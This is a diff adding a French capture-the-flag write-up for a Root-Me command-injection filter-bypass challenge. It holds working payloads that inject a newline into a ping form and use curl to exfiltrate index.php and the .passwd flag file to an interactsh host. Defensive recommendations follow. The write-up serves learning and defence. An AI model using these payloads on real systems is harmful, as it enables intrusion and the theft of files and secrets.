@@ -292,7 +292,59 @@ Le paramètre `order` est utilisé directement dans une requête SQL sans être 
 
 [https://www.root-me.org/fr/Challenges/Web-Serveur/Injection-de-commande-Contournement-de-filtre](https://www.root-me.org/fr/Challenges/Web-Serveur/Injection-de-commande-Contournement-de-filtre)
 
-<!-- TODO -->
+## Étapes
+
+On dispose d'un formulaire simple avec un seul input permettant de ping une IP.
+
+1. En testant `127.0.0.1`, la réponse est "ping ok".\
+  On suppose donc qu'en arrière-plan, la commande éxecutée est: `ping -c 1 127.0.0.1`
+  <br /><img src="images/cmd-injection1.png" alt="cmd-injection" width="800"/>
+
+2. On tente d'injecter : `127.0.0.1; whoami` -> "syntax error".
+
+3. On essaie alors de contourner un éventuel filtre sur `;` en utilisant un retour à la ligne (`%0A`). Là encore, "syntax error".
+
+4. Avec Burp, envoyer la requête dans le repeater.
+  <br /><img src="images/cmd-injection2.png" alt="cmd-injection" width="800"/>
+
+5. On réessaie avec `%0A` et cette fois, c'est concluant : "ping ok".
+
+6. Puisqu'on peut exécuter d'autres commandes, on suit les instructions du challenge : récupérer `index.php`.
+  On utilisera `curl` vers `interactsh` pour exfiltrer le fichier.
+
+7. Toujours depuis le Repeater, on modifie le payload :\
+  `ip=127.0.0.1%0Acurl --data-binary @index.php rkiguqojccliuysokkwxsnm2zvs8hm5jd.oast.fun`\
+  <img src="images/cmd-injection3.png" alt="cmd-injection" width="800"/>
+
+    Explication des paramètres curl `--data-binary` et `@index.php`:
+
+  - `--data-binary`: Envoie les données **brutes**, sans modification, idéal pour exfiltrer un fichier exactement tel qu'il est.
+  - `@index.php`: Lire le fichier et d'envoyer son contenu dans le corps de la requête.\
+    Sur Interactsh, on voit bien le contenu d'`index.php`. Celui-ci indique que le flag se trouve dans `.passwd`.\
+    <img src="images/cmd-injection4.png" alt="cmd-injection" width="800"/>
+
+8. On répète donc l'opération : `ip=127.0.0.1%0Acurl --data-binary @.passwd rkiguqojccliuysokkwxsnm2zvs8hm5jd.oast.fun`
+  <br /><img src="images/cmd-injection5.png" alt="cmd-injection" width="800"/>
+
+  Et cette fois : **challenge réussi**, le flag est récupéré !
+  <br /><img src="images/cmd-injection6.png" alt="cmd-injection" width="800"/>
+
+### Explication
+
+La commande `ping` est exécutée sans filtrage des entrées.
+En injectant un retour à la ligne via `%0A`, on peut exécuter des commandes supplémentaires.
+Dans notre cas, on a utilisé `curl` pour exfiltrer les fichiers `index.php` et `.passwd` vers un serveur contrôlé (interactsh).
+
+### Recommandations
+
+- Valider et assainir les entrées utilisateur
+- Utiliser des listes blanches pour les entrées attendues (ex : adresses IP)
+- Éviter d'exécuter des commandes système avec des entrées utilisateur
+- Mettre en place une surveillance des commandes exécutées pour détecter les activités suspectes
+
+### Références
+
+[https://portswigger.net/web-security/os-command-injection](https://portswigger.net/web-security/os-command-injection)
 
 <br />
 <hr style="height: 0; border: 1px white solid;" />
